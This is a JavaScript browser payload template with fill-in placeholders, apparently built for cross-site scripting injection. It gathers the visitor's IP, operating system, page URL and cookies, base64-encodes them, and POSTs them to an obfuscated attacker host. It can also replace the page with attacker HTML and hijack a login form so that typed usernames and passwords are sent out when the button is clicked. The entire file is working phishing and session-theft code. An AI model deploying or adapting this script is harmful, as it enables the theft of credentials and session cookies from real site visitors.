var Rd_Path='@Rd_Path';
var Host='@IPCONFIG';
var Web_Chang='@Web';
var User_Name_key='@User_Name_key';
var Password_Key='@Password_Key';
var Button='@Button';
var HTML_Code = 'null';

var User_Infor = {
    IP:null,
    Host_Type:null,
    Visit_URL:null,
    Cookies:null,
    NetWork:null,
    Time:null,
    action:null,
    username:null,
    password:null
};
function getNetworkType() {
    var ua = navigator.userAgent;
    var networkStr = ua.match(/NetType\/\w+/) ? ua.match(/NetType\/\w+/)[0] : 'NetType/other';
    networkStr = networkStr.toLowerCase().replace('nettype/', '');
    var networkType;
    switch (networkStr) {
        case 'wifi':
            networkType = 'wifi';
            break;
        case '4g':
            networkType = '4g';
            break;
        case '3g':
            networkType = '3g';
            break;
        case '3gnet':
            networkType = '3g';
            break;
        case '2g':
            networkType = '2g';
            break;
        default:
            networkType = 'other';
    }
    return networkType;
}
function getCusIpAdress() {
    var data = null;
    var xmlHttpRequest;
    if (window.ActiveXObject) {
        xmlHttpRequest = new ActiveXObject("Microsoft.XMLHTTP");
    } else if (window.XMLHttpRequest) {
        xmlHttpRequest = new XMLHttpRequest();
    }
    try {
        xmlHttpRequest.onreadystatechange = function () {
            if (xmlHttpRequest.readyState == 4) {
                if (xmlHttpRequest.status == 200) {
                    data = xmlHttpRequest.responseText;
                } else {
                    data = 'None';
                }
            }
        };
        xmlHttpRequest.open("GET", atob("aHR0cHM6Ly9hcGk0LmlwaWZ5Lm9yZy8/Zm9ybWF0PXRleHQ="), false);
        xmlHttpRequest.send(null);
    } catch (error) {
        data = 'None';
    }
    return data;
}


function browserRedirect(){
    var sUserAgent = navigator.userAgent;
    var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");
    var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
    if (isMac) return "Mac";
    var isUnix = (navigator.platform == "X11") && !isWin && !isMac;
    if (isUnix) return "Unix";
    var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
    if (isLinux) {
        var isAndroid = sUserAgent.indexOf("Android") > -1 ;
        if (isAndroid) return "Android Mobile";
        else return "Linux";
    }
    if (isWin) {
        var isWin2K = sUserAgent.indexOf("Windows NT 5.0") > -1 || sUserAgent.indexOf("Windows 2000") > -1;
        if (isWin2K) return "Win2000";
        var isWinXP = sUserAgent.indexOf("Windows NT 5.1") > -1 || sUserAgent.indexOf("Windows XP") > -1;
        if (isWinXP) return "WinXP";
        var isWin2003 = sUserAgent.indexOf("Windows NT 5.2") > -1 || sUserAgent.indexOf("Windows 2003") > -1;
        if (isWin2003) return "Win2003";
        var isWinVista= sUserAgent.indexOf("Windows NT 6.0") > -1 || sUserAgent.indexOf("Windows Vista") > -1;
        if (isWinVista) return "WinVista";
        var isWin7 = sUserAgent.indexOf("Windows NT 6.1") > -1 || sUserAgent.indexOf("Windows 7") > -1;
        if (isWin7) return "Win7";
        var isWin10 = sUserAgent.indexOf("Windows NT 10") > -1 || sUserAgent.indexOf("Windows 10") > -1;
        if (isWin10) return "Win10";
    }
    return "?";
}
function DATA_Packet(DATA){
    var xhr = new XMLHttpRequest();
    xhr.open("POST",atob(Host)+"/JSONDATA",true);//Tag
    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded;charset=utf-8');
    xhr.send(JSON.stringify(DATA));
    return true;
}
function Get_Base_Message(){
    User_Infor['IP']=Encryption(getCusIpAdress());
    User_Infor['Host_Type']=Encryption(browserRedirect());
    User_Infor['Visit_URL']=Encryption(document.URL);
    User_Infor['NetWork']=Encryption(getNetworkType());
    User_Infor['Time']=Encryption(new Date().toLocaleString());
    User_Infor['Cookies']=Encryption(document.cookie) || null;
    if(Rd_Path!="@Rd_Path"){
        User_Infor['action']=Encryption(Rd_Path) || null;
    }
    return true

}
function Encryption(DATA){
return btoa(DATA);
}

function main(){

    if (Get_Base_Message()!=true){
        return false;
    }
    if (Web_Chang != '@Web'){
        Chang_Page();
        Inject_Web_Code();
        if(Rd_Path != "@Rd_Path"){
            setTimeout(Rd_Path,4000);
        }
    }
    else{
    DATA_Packet(User_Infor);
    if(Rd_Path != "@Rd_Path") {
            setTimeout(Rd_Path,4000);}
        }
}

function Chang_Page()
{
var HTML=document.getElementsByTagName("html")[0];
while(HTML.firstChild){
HTML.removeChild(HTML.firstChild);
}
HTML.innerHTML = HTML_Code;}

function Encryption(DATA){
return btoa(DATA);
}

function Form_hijacking(){
    User_Infor['username']=Encryption(document.getElementById(User_Name_key).value);
    User_Infor['password']=Encryption(document.getElementById(Password_Key).value);
    }

function Inject_Web_Code(){
    if(User_Name_key!="@User_Name_key" && Password_Key!="@Password_Key"){

        document.getElementById(Button).onclick = function() {
            Form_hijacking();
            DATA_Packet(User_Infor);
        }
        }
}
main();



